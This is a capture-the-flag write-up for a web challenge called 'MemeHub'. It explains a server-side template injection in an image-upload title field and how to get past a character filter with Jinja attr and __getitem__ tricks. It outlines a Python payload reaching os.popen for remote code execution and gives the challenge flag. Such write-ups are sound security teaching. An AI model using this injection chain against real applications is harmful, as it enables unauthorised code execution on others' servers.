# MemeHub

**`Author:`** [Malik](https://github.com/malikDaCoda)

## Description

> Oh! There you are! Let me just introduce you to the best spot for top-tier memes: MemeHub!!

## Write-up

### Brief Summary (not so brief)

- vuln: server-side template injection in the title field when uploading an image
- after some testing, we can conclude that the characters `.[]` are not allowed
- we have to find bypasses for the following constructs :
  - `obj.attribute` --> `obj|attr('attribute')` (`attr` is a filter in jinja template engine)
  - `obj[index]` --> `obj.__getitem__(index)` --> `obj|attr('__getitem__')(index)`
  - `obj['key']` --> `obj.__getitem__('key')` --> `obj|attr('__getitem__')('key')`
- after converting a payload similar to `''.__class__.__base__.__subclasses__()[INDEX_OF_A_SUBCLASS_IMPORTING_SYS].__init__.__globals__['sys'].modules['os'].popen(CMD).read()`, we get RCE

### TODO

Flag: `shellmates{tR0ll1nG_@_mem3R_w1tH_4_w3ll_cr4fT3d_1nj3ct10n}`
